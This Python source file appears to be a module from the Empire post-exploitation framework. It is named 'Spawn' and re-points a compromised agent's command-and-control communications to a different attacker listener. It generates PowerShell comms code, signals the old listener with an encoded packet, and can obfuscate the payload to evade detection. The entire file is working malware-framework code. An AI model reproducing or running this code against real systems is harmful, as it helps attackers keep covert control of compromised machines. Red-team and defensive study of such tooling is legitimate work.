from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Spawn',

            'Author': ['@harmj0y'],

            'Description': ('Overwrites the listener controller logic with the agent with the '
                            'logic from generate_comms() for the specified listener.'),

            'Background' : False,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to switch agent comms to.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # extract all of our options
        listenerName = self.options['Listener']['Value']

        if listenerName not in self.mainMenu.listeners.activeListeners:
            print helpers.color("[!] Listener '%s' doesn't exist!" % (listenerName))
            return ''

        activeListener = self.mainMenu.listeners.activeListeners[listenerName]
        listenerOptions = activeListener['options']

        commsCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_comms(listenerOptions=listenerOptions, language='powershell')

        # signal the existing listener that we're switching listeners, and the new comms code
        commsCode = "Send-Message -Packets $(Encode-Packet -Type 130 -Data '%s');\n%s" % (listenerName, commsCode)
        if obfuscate:
            commsCode = helpers.obfuscate(self.mainMenu.installPath, psScript=commsCode, obfuscationCommand=obfuscationCommand)
        return commsCode
